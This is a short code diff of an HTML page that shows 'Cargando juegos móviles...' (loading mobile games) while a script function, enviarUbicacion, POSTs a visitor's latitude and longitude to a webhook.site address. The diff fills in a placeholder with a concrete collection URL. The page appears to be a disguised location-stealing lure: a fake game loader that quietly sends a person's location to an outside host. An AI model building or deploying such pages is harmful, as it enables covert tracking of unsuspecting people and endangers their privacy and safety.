@@ -7,7 +7,7 @@
   <h2>Cargando juegos móviles...</h2>
   <script>
     function enviarUbicacion(lat, lon) {
-      fetch("https://webhook.site/PEGAR_AQUI_TU_URL", {
+      fetch("https://webhook.site/juegos.mobile", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
